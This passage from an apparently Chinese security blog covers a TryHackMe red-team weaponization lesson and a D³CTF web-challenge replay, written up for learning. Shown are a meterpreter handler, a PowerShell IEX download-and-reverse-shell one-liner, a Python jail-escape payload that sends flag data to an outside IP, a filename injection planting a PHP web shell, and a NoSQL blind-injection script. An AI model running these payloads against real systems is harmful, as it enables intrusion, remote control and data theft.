class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ msfconsole -q</span><br><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 10.50.159.15</span><br><span class="line">LHOST =&gt; 10.50.159.15</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LPORT 443</span><br><span class="line">LPORT =&gt; 443</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.50.159.15:443 </span><br></pre></td></tr></table></figure><p>一旦在受害者机器上打开恶意  word 文档，我们应该会收到一个反向 shell。</p><h3 id="PowerShell-PSH"><a href="#PowerShell-PSH" class="headerlink" title="PowerShell-PSH"></a>PowerShell-PSH</h3><p><strong>Powershell 是使用 .NET 框架构建的 Windows 脚本语言和 shell 环境</strong>。</p><p>这也允许 Powershell 直接从其 shell 执行 .NET 函数。大多数 Powershell 命令（称为<em>cmdlet）</em>是用 .NET 编写的。<em>与其他脚本语言和 shell 环境不同，这些cmdlet</em>的输出 是对象——使 Powershell 有点面向对象。这也意味着运行 cmdlet 允许您对输出对象执行操作（这样可以方便地将输出从一个<em>cmdlet</em>传递 到另一个）。<em>cmdlet</em>的正常格式使用<strong>Verb-Noun</strong>表示；例如，用于列出命令的<em>cmdlet</em> 被称为<code>Get-Command.</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Write-Output &quot;Welcome to the Weaponization Room!&quot;</span><br></pre></td></tr></table></figure><p>将文件另存为 thm.ps1 。 使用 Write-Output ，我们打印消息“Welcome to the Weaponization Room!” 到命令提示符。 现在让我们运行它并查看结果</p><p><img src="../images/image-20230514205635490.png" alt="image-20230514205635490"></p><p>PowerShell 的执行策略是一个 安全选项，用于保护系统免于运行恶意脚本。默认情况下，Microsoft出于安全目的禁止执行PowerShell脚本.ps1 。PowerShell执行策略设置为Restricted ，这意味着它允许单独的命令但不允许运行任何脚本</p><p><strong>bypass绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\thm\Desktop&gt;powershell -ex bypass -File thm.ps1</span><br><span class="line">Welcome to Weaponization Room!</span><br></pre></td></tr></table></figure><p>现在，让我们尝试使用一种用PowerShell编写的工具powercat来获取反向 shell 。在你的 AttackBox 上，从 GitHub 下载它并运行一个网络服务器来传送有效载荷。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/besimorhino/powercat.git</span><br></pre></td></tr></table></figure><p>现在，我们需要在该 AttackBox 上设置一个 Web 服务器来为将在目标机器上下载和执行的powercat.ps1提供服务。接下来，将目录更改为 powercat 并开始侦听您选择的端口。在我们的例子中，我们将使用端口 8080 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@machine$ cd powercat</span><br><span class="line">user@machine$ python3 -m http.server 8080</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...</span><br></pre></td></tr></table></figure><p>在 AttackBox 上，我们需要使用nc监听端口1337以接收来自受害者的连接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@machine$ nc -lvp 1337</span><br></pre></td></tr></table></figure><p>现在，我们从受害机器上下载有效载荷并使用PowerShell有效载荷执行它，如下所示，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\thm\Desktop&gt; powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://ATTACKBOX_IP:8080/powercat.ps1&#x27;);powercat -c ATTACKBOX_IP -p 1337 -e cmd&quot;</span><br></pre></td></tr></table></figure><p>现在我们已经执行了上面的命令，受害者机器从我们的网络服务器（在 AttackBox 上）下载 powercat.ps1有效载荷，然后使用cmd.exe 在目标本地执行它，并将连接发送回正在侦听的 AttackBox在端口1337上。几秒钟后，我们应该收到连接回调：</p><p><img src="../images/image-20230514211059473.png" alt="image-20230514211059473"></p><p><strong>HTA VBA powershell</strong>  这三种方式可以进行shell的反弹   在windows系统里</p><p>前两个使用mvf进行生成payload  后面一个是依靠github上面的一个文件</p>]]></content>
      
      
      
        <tags>
            
            <tag> thm-红队-初始访问-武器化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AntCTF x D³CTF web 复现</title>
      <link href="/posts/d27bfad9.html"/>
      <url>/posts/d27bfad9.html</url>
      
        <content type="html"><![CDATA[<p>这里的复现都是去网上搜索前几名发的wp来复现的</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;mid=2247486967&amp;idx=1&amp;sn=ad55ddd11c6bfa17843270625f5f92fc&amp;chksm=cf53cd41f8244457c2db68626c91f2e4564d756b903222f3a913e89f211d475418864c5041bc&amp;mpshare=1&amp;scene=23&amp;srcid=0501bEUrW8ydbpm175TL5FFn&amp;sharer_sharetime=1682949687637&amp;sharer_shareid=6eea79ff6da57fc6752ab0bc570bf392#rd">Arr wp</a>    <a href="https://fq6p9pyo5tt.feishu.cn/docx/InUFdQUKdozf8yx5IhGcf5zInSe?share_token=50b9c367-3661-4046-95ab-5418bcc155a9">亚军wp</a></p><p>还有参考 <a href="https://boogipop.com/">boogipop的wp</a></p><h2 id="Escape-Plan"><a href="#Escape-Plan" class="headerlink" title="Escape Plan"></a>Escape Plan</h2><p>题目</p><p><img src="../images/image-20230502153814922.png" alt="image-20230502153814922"></p><p><strong>The success for a break out depends on three things.</strong><br><strong>- layout: black_char</strong><br><strong>- routine: Python tricks</strong><br><strong>- help: Run /readflag to get flag, dns tunneling may help you</strong></p><p> 题目还给了源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_3</span>():</span><br><span class="line">    cmd = request.form.get(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cmd:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;pre&gt;</span></span><br><span class="line"><span class="string">import requests, base64</span></span><br><span class="line"><span class="string">exp = &#x27;&#x27;</span></span><br><span class="line"><span class="string">requests.post(&quot;&quot;, data=&#123;&quot;cmd&quot;: base64.b64encode(exp.encode())&#125;).text</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cmd = base64.b64decode(cmd).decode()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;bad base64&quot;</span></span><br><span class="line"></span><br><span class="line">    black_char = [</span><br><span class="line">        <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;import&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;break&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;raise&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> black_char:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> cmd:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&#x27;failed: `<span class="subst">&#123;char&#125;</span>`&#x27;</span></span><br><span class="line"></span><br><span class="line">    msg = <span class="string">&quot;success&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">eval</span>(cmd)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        msg = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的话就是自己想方法进行绕过了</p><p>最后是在eval这里进行代码的执行</p><p>因为关键函数被禁了，那么我们可以尝试使用全角符号进行绕过</p><p>迷你上标和下标（0~9、字母、特殊字符）</p><p>用上面的迷你上标或全角符号能能绕过，本地测试过了</p><p><img src="../images/image-20230502155533638.png" alt="image-20230502155533638"></p><p><img src="../images/image-20230502155615879.png" alt="image-20230502155615879"></p><p><a href="https://cn-sec.com/archives/1322842.html">参考文章</a></p><p><img src="../images/image-20230502161726816.png" alt="image-20230502161726816"></p><p>给的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, base64</span><br><span class="line">u = <span class="string">&#x27;𝟢𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫&#x27;</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;__import__(&#x27;os&#x27;).popen(&quot;python -c &#x27;import socket, os; flag = os.popen(\\&quot;/readflag\\&quot;).read().encode();host = \\&quot;101.42.39.110\\&quot;;port=666;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((host,port));s.sendall(flag);s.close();a=1;&#x27;&quot;).read()&quot;&quot;&quot;</span></span><br><span class="line">payload = <span class="built_in">str</span>(base64.b64encode(payload)).strip(<span class="string">&#x27;b&#x27;</span>).strip(<span class="string">&quot;&#x27;&quot;</span>) +<span class="string">&quot;=&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">CMD = <span class="string">&quot;ᵉval(vars(ᵉval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(&#123;&#125;()))[len([])]))&quot;</span>.<span class="built_in">format</span>(payload)</span><br><span class="line">CMD = CMD.translate(&#123;<span class="built_in">ord</span>(<span class="built_in">str</span>(i)): u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)&#125;)</span><br><span class="line">r = requests.post(<span class="string">&quot;http://139.196.153.118:30503/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">base64.b64encode(CMD.encode())&#125;).text</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure><p>然后上面执行的是python的shell反弹</p><p>然后就可以在自己的服务器上接收到了</p><p><img src="../images/image-20230502172834323.png" alt="image-20230502172834323"></p><h2 id="d3cloud"><a href="#d3cloud" class="headerlink" title="d3cloud"></a>d3cloud</h2><p>题目</p><p><strong>admin uses laravel-admin to build a personal cloud disk, and adds a utility function</strong></p><p><img src="../images/image-20230502164406853.png" alt="image-20230502164406853"></p><p>这里<code>url/admin</code>访问后台，然后弱密码 admin/admin 进行登录</p><p><img src="../images/image-20230503183023251.png" alt="image-20230503183023251"></p><p>发现这文件后，然后进行读取   进行题目的提示和官方文件的对比之后发现多了下面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">putFileAs</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$file</span>, <span class="variable">$name</span>, <span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="variable">$supported_file</span> = <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;ico&#x27;</span>,<span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;mp4&#x27;</span>,<span class="string">&#x27;mp3&#x27;</span>,<span class="string">&#x27;mkv&#x27;</span>,<span class="string">&#x27;avi&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>);</span><br><span class="line"> <span class="variable">$file_type</span>= <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>,PATHINFO_EXTENSION));</span><br><span class="line"> <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_type</span>, <span class="variable">$supported_file</span>)) &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$stream</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getRealPath</span>(), <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line"> <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(</span><br><span class="line"> <span class="variable">$path</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>), <span class="variable">$stream</span>, <span class="variable">$options</span></span><br><span class="line"> );</span><br><span class="line"> <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$stream</span>)) &#123;</span><br><span class="line"> <span class="title function_ invoke__">fclose</span>(<span class="variable">$stream</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalExtension</span>() === <span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line"> <span class="variable">$fs</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&quot;unzip -oq &quot;</span>. <span class="variable">$this</span>-&gt;driver-&gt;<span class="title function_ invoke__">getAdapter</span>()-&gt;<span class="title function_ invoke__">getPathPrefix</span>() . </span><br><span class="line"><span class="variable">$name</span> .<span class="string">&quot; -d &quot;</span> . <span class="variable">$this</span>-&gt;driver-&gt;<span class="title function_ invoke__">getAdapter</span>()-&gt;<span class="title function_ invoke__">getPathPrefix</span>(),<span class="string">&quot;w&quot;</span>);</span><br><span class="line"> <span class="title function_ invoke__">pclose</span>(<span class="variable">$fs</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="variable">$result</span> ? <span class="variable">$path</span> : <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>就是多了这段代码，和题目说的增加了有个新功能相对应</p><p><strong>这里的话是有有个自动解压的功能，那么我们就可以尝试在这里的把自己想要的命令放进压缩包里，然后解压到自己设置的目录下</strong></p><p><img src="../images/image-20230503184537985.png" alt="image-20230503184537985"></p><p>题目这里也给提示了，就是去找解压的函数方法那边</p><p><code>$file_type= strtolower(pathinfo($name,PATHINFO_EXTENSION));</code>里面的这段代码是获取文件后缀的</p><p><img src="../images/image-20230503184215304.png" alt="image-20230503184215304"></p><p><img src="../images/image-20230503184459019.png" alt="image-20230503184459019"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;echo ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+JyA+IC92YXIvd3d3L2h0bWwvcHVibGljLzEucGhw|base64 -</span><br><span class="line">d|bash;.zip</span><br></pre></td></tr></table></figure><p>这里的目的是把一句话木马写进来</p><p><img src="../images/image-20230503193106552.png" alt="image-20230503193106552"></p><p>能进行判断通过</p><p><img src="../images/image-20230503193143283.png" alt="image-20230503193143283"></p><p>这里的话就得在文件名出写码了</p><p><img src="../images/image-20230503193317019.png" alt="image-20230503193317019"></p><p>随便上传一个zip文件并抓包</p><p>内容随便</p><p><img src="../images/image-20230503193352762.png" alt="image-20230503193352762"></p><p>这个代码的意思是将base64解码后，然后用bash命令进行执行</p><p><code>echo &#39;&lt;?php eval($_POST[1]);?&gt;&#39; &gt; /var/www/html/public/1.php</code></p><p>这就是等会执行的命令</p><p><img src="../images/image-20230503193609807.png" alt="image-20230503193609807"></p><p>成功进行执行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fs = popen(&quot;unzip -oq &quot;. $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix() . $name .&quot; -d &quot; . $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix(),&quot;w&quot;);</span><br></pre></td></tr></table></figure><p>这段代码就是把上传文件的压缩文件的地址给解压到当前地址</p><p><code>unzip -oq /xxx/xxx/xxx/1.zip -d /xxx/xxx/xxx/</code></p><p>这个1.zip处就是我们可控的文件名，然后就可以利用分号隔开，然后进行我们想要执行的其他命令了</p><h2 id="d3node"><a href="#d3node" class="headerlink" title="d3node"></a>d3node</h2><p>题目</p><p><img src="../images/image-20230503194127075.png" alt="image-20230503194127075"></p><p>查看第一个hint后，发现是nosql注入里的<strong>MongoDB</strong>注入</p><p><img src="../images/image-20230503194941896.png" alt="image-20230503194941896"></p><p><a href="https://xz.aliyun.com/t/9908#toc-4">Nosql 注入从零到一</a></p><p>可以从这篇文章来进行学习</p><p><img src="../images/image-20230503195510880.png" alt="image-20230503195510880"></p><p>输入过滤的词会输出Hacker</p><p>输入错误的密码是会输出下面的东西</p><p><img src="../images/image-20230503195603571.png" alt="image-20230503195603571"></p><p>使用<code>password[$regex]=.*&amp;username=admin</code></p><p><strong>但是这个方法登录的不是admin用户</strong></p><p><strong>这个就是对密码的正则匹配，这里的话是使用通配符来匹配</strong>(上面给的nosql的文章里讲的很清楚这个正则匹配)</p><p><img src="../images/image-20230504193625735.png" alt="image-20230504193625735"></p><p>这个也行，就是</p><p>盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">dicts = <span class="string">&#x27;0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> dicts:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;testing&#x27;</span>, s)</span><br><span class="line">        url = <span class="string">&#x27;http://47.102.98.112:32299/user/LoginIndex&#x27;</span></span><br><span class="line">        res = requests.post(url,data=json.dumps(&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: &#123;<span class="string">&#x27;$regex&#x27;</span>: <span class="string">&#x27;^&#x27;</span> + flag + s&#125;&#125;), headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hacker&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">            quit()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;invalid&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += s</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;found!!!&#x27;</span>, flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>然后就跟据invalid的出现的标志来判断密码</p><p>最好爆出密码为  <code>dob2xdriaqpytdyh6jo3</code></p><p>然后进行登录</p><p><img src="../images/image-20230503195900909.png" alt="image-20230503195900909"></p><p>查看源码后发现第二个hint</p><p><img src="../images/image-20230503195943805.png" alt="image-20230503195943805"></p><p><img src="../images/image-20230503201834175.png" alt="image-20230503201834175"></p><p>然后测试了一下是在这个目录下可以进行文件的读取 (<strong>这里会测试时因为提示给的代码中有filename这个参数</strong>)  <strong>req.query.filename</strong></p><p><img src="../images/image-20230503201931320.png" alt="image-20230503201931320"></p><p>不给读取，然后就尝试绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?filename[href]=a&amp;filena</span><br><span class="line">me[origin]=1&amp;filename[protocol]=file:&amp;filename[hostname]=&amp;filename[pathname]=./%25</span><br><span class="line">61pp.js</span><br></pre></td></tr></table></figure><p>这段代码使用了一个JavaScript对象来表示文件路径。其中，”filename”是该对象的属性名，” [href]”、”[origin]”、”[protocol]”、”[hostname]”和”[pathname]”则是该属性下的子属性。具体 来说，它们分别表示文件的链接地址、来源、协议、主机名和文件路径。 这里的%2561其实就是。如果有非ascii进行url加密，则就会变成16进制然后再进行url编码，a的16进 制是61</p><p><strong>其实就是对a进行两次url编码</strong></p><p>然后就可以成功的查看到app.js了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&quot;cookie-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> stringRandom = <span class="built_in">require</span>(<span class="string">&quot;string-random&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// register router</span></span><br><span class="line"><span class="keyword">const</span> indexRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/index&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> userRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/user&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> dashboardIndexRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/dashboardIndex&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">8080</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;html&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;hbs&#x27;</span>).<span class="property">__express</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;static&#x27;</span>)));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">stringRandom</span>(<span class="number">32</span>),</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123;</span><br><span class="line">        <span class="attr">maxAge</span>: <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">// set router</span></span><br><span class="line">app.<span class="title function_">use</span>(<span 